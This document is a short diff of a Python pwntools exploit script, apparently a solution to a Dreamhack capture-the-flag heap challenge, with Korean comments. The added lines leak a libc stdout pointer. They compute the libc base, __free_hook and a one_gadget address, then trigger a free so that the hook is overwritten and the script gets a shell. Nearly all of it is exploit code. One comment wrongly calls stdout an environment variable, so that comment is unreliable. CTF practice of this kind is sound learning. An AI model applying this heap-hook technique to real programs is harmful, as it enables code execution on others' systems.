@@ -54,13 +54,24 @@ alloc(0x30, p64(addr_stdout))
 # libc-2.27.so에서 stdout의 하위 3바이트는 760
 alloc(0x30, "B" * 0x8)
 alloc(0x30, "\x60")
-# stdout: 0x601010에 위치
+# stdout은 중요한 환경변수이므로 값이 변경되면 안 된다.
 
 
 # [5] libc_base & one_gadget
 print_chunk()
-"""
 p.recvuntil("Content: ")
-stdout = 
-"""
+stdout = u64(p.recv(6).ljust(8, b"\x00"))
+libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
+free_hook = libc_base + libc.symbols["__free_hook"]
+one_gadget = libc_base + 0x4f432
+
+slog("free_hook", free_hook)
+slog("one_gadget", one_gadget)
 p.interactive()
+
+# [6] Overwrite free hook with one gadget
+alloc(0x40, "dreamhack")
+free()
+
+
+
